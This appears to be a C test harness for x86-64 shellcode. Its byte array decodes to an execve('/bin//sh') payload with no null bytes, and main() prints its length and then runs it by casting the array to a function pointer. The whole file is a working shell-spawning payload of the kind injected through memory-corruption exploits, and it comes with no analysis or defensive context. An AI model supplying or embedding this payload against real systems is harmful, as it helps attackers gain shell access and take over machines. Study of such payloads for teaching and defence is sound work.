#include <stdio.h>
#include <string.h>

unsigned char code[]= \
      "\x48\x31\xf6\x56\x48\xbf"
		  "\x2f\x62\x69\x6e\x2f"
		  "\x2f\x73\x68\x57\x54"
		  "\x5f\xb0\x3b\x99\x0f\x05";
int main(){

        printf("length of your shellcode is: %d\n", (int)strlen(code));

        int (*ret)() = (int(*)())code;

        ret();
}
